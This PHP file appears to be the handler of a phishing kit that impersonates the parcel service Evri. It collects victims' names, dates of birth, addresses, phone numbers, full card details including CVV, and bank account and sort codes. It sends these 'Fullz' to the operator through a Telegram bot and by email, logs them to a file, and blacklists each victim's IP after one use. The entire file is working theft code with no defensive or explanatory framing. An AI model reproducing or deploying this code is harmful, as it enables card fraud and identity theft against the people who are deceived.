<?php
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";

    $ccno = str_replace(' ', '', $_POST['ccno']);
    
    $bin = substr($ccno, 0, 6);
    $ccc = BankDetails($ccno);
    $scheme = strtoupper($ccc['scheme']);
    $type = strtoupper($ccc['type']);
    $brand = strtoupper($ccc['brand']);
    $bank = strtoupper($ccc['bank']['name']);
    
    $ccinfo = "$bin | $scheme | $type | $brand | $bank";


    $DOB = $_POST['dob'];

    
    $subject = "$bin $bank |$DOB Evri Fullz";
    
    $message .= "|------------ Evri Billing ------------|\n";
    $message .= "Full Name          : ".$_POST['fullName']."\n";
    $message .= "Date of Birth      : ".$_POST['dob']."\n";
    $message .= "Phone Number       : ".$_POST['mobile']."\n";
    $message .= "Address            : ".$_POST['address']."\n";
    $message .= "Postcode           : ".$_POST['postcode']."\n";

    $message .= "|------------ Card Details ------------|\n";
    $message .= "BIN Info           : ".$ccinfo."\n";
    $message .= "Card Number        : ".$_POST['ccno']."\n";
    $message .= "Expiry Date        : ".$_POST['expiry']."\n";
    $message .= "CVV                : ".$_POST['cvv']."\n";
    if( isset($_POST['account']) ){
        $message .= "Account No.        : ".$_POST['account']."\n";
        $message .= "Sort Code          : ".$_POST['sort']."\n";
    }
    $message .= "|----------- I N F O | I P ------------|\n";
    $message .= "|Client IP         : ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent         : ".$useragent."\n";

    // if($Encrypt==1) {
        // $method = 'aes-256-cbc';
        // $key = substr(hash('sha256', $password, true), 0, 32);
        // $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
        // $encrypted = base64_encode(openssl_encrypt($message1, $method, $key, OPENSSL_RAW_DATA, $iv));
    // }
	if($Send_Telegram){
        file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
    }
	
    if($Send_Log==1) {
        mail($send,$subject,$message);
    }
    
    if($Save_Log==1) {
        $file=fopen("Logs/Evri Fullz.txt","a");
        fwrite($file,$message);
        fclose($file);
    }

    if($One_Time_Access){        
        $ip = $_SERVER['REMOTE_ADDR'];
        $fp = fopen("includes/blacklist.dat", "a");
        fputs($fp, "\r\n$ip\r\n");
        fclose($fp);
        session_destroy();
    }
?>